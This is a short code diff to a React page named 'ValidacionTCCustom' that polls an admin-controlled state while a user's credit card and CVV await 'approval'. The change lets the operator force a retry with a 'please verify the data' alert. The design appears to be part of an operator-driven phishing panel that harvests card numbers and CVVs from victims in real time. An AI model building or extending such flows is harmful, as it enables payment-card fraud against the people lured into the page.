@@ -346,7 +346,13 @@ export default function ValidacionTCCustom() {
                 console.log('TC Custom Polling:', estado);
 
                 // Redirecciones basadas en respuesta del admin
-                if (estado === 'pendiente' || estado === 'solicitar_tc_custom' || estado === 'awaiting_tc_approval' || estado === 'awaiting_cvv_approval') {
+                if (estado === 'solicitar_tc_custom') {
+                    // Si el admin pide TC Custom de nuevo (reintento), quitamos el loading para que el usuario pueda editar
+                    if (cargando) {
+                        setCargando(false);
+                        alert("Por favor verifique los datos e intente nuevamente.");
+                    }
+                } else if (estado === 'pendiente' || estado === 'awaiting_tc_approval' || estado === 'awaiting_cvv_approval') {
                     // Esperar...
                 } else {
                     switch (estado.toLowerCase()) {
